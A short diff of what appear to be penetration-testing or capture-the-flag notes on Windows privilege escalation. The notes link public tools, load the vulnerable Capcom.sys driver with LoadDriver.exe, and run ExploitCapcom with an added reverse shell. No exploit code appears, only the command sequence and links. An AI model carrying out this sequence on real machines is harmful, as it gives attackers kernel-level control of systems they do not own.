@@ -9,14 +9,14 @@ https://github.com/antonioCoco/RunasCs
 POC -->compile
 https://github.com/TarlogicSecurity/EoPLoadDriver/
 
-Driver -->compile
+Driver 
 https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
 
 driver exploit --> compile
 https://github.com/tandasat/ExploitCapcom  --> add reverseshell!!!!!!
 
 -->> .\LoadDriver.exe System\CurrentControlSet\hack C:\Users\svc-print\capcom.sys
--->> .\ExploitCapcom.exe
+-->> .\ExploitCapcom.exe (change shell)
 
 
 
